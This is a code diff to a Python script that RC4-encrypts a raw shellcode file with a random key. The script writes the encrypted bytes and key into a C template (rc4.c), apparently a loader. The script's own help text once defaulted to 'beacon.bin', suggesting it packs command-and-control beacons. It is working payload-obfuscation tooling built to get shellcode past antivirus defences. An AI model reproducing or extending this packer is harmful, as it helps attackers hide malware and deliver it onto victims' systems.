@@ -46,10 +46,33 @@ def encrypt(plaintext: bytes, key: bytes) -> bytes:
         
     return ciphertext
 
+def build_template(shellcode, shellcode_length, key):
+    with open("rc4_template.c") as tplate:
+        template = tplate.read()
+        template = template.replace("###SHELLCODE_LENGTH###", str(shellcode_length))
+        template = template.replace("###SHELLCODE###", shellcode)
+        template = template.replace("###KEY###", key)
+
+    with open("rc4.c", "w") as outfile:
+        outfile.write(template)
+
+
+def get_raw_sc(input_file):
+    input_file = input_file
+    file_shellcode = b''
+    try:
+        with open(input_file, 'rb') as shellcode_file:
+            file_shellcode = shellcode_file.read()
+            file_shellcode = file_shellcode.strip()
+        return(file_shellcode)
+    except FileNotFoundError:
+        exit("\n\nThe input file you specified does not exist! Please specify a valid file path.\nExiting...\n")
+
+
 def main():
     parser = argparse.ArgumentParser()
     parser.add_argument("-i", "--input", type=str,
-                        help="File containing raw shellcode. Defaults to beacon.bin.")
+                        help="File containing raw shellcode.")
     
     if len(argv) == 1:
         # No arguments received.  Print help and exit
@@ -63,14 +86,26 @@ def main():
         print("You must supply a raw shellcode file using -i/--input!")
         exit(1)
 
+    original_shellcode = ""
+    raw_sc = get_raw_sc(input_file)
+    for byte in raw_sc:
+        original_shellcode = original_shellcode + str(hex(byte).zfill(2)) + ", "
+    original_shellcode = original_shellcode.rstrip(', ')
+
     # https://stackoverflow.com/a/2257449
     key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
 
+    # read and encrypt shellcode
     with open(args.input, 'rb') as f:
         result = encrypt(plaintext=f.read(), key=key)
-    
-    print('char key[] = "{}";'.format(key))
-    print('char rc4[] = {{{}}};'.format(', '.join(hex(x) for x in result)))
+
+    # format the shellcode string
+    shellcode = '{}'.format(', '.join(hex(x) for x in result))
+
+    build_template(shellcode, len(raw_sc), key)
+
+    print("Original shellcode:")
+    print(original_shellcode)
  
 
 if __name__ == '__main__':
